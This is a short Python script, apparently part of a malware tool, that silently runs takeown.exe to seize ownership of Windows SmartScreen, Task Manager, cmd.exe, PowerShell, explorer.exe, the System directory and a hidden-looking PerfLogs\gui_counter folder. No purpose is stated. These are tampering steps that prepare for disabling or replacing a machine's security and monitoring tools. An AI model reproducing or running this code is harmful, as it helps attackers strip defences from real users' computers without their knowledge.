#!/usr/bin/python
#coding:utf-8
import os, sys
# Function to get own process on windows
def process():
    proc = ['smartscreen.exe', 'taskmgr.exe', 'cmd.exe']
    for procs in proc:
        tkd = "START /MIN \\windows\\system32\\takeown.exe /F \\Windows\\System32\\%s" %(procs)
        os.system(tkd)
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for procs in pwr_sh:
        tkd = "START /MIN \\windows\\system32\\takeown.exe /F \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s" %(procs)
        os.system(tkd)
# Function to get own regedit and explorer on windows
def exp():
    tkd = "START /MIN \\windows\\system32\\takeown.exe /F \\Windows\\explorer.exe"
    os.system(tkd)
# Function to get own the directory destination and contains
def perf():
    tkd = "START /MIN \\windows\\system32\\takeown.exe /F \\PerfLogs /R"
    os.system(tkd)
# Function to get own the gui_counter directory recursively
def perfall():
    tkb = "\\windows\\system32\\takeown.exe /F \\PerfLogs\\gui_counter /R"
    os.system(tkb)
    tkd = "\\windows\\system32\\takeown.exe /F \\PerfLogs\\gui_counter\\* /R"
    os.system(tkd)
# Function to get own system directory
def sysDir():
    tks = '\\windows\\system32\\takeown.exe /F \\Windows\\System /R /D O'
    os.system(tks)
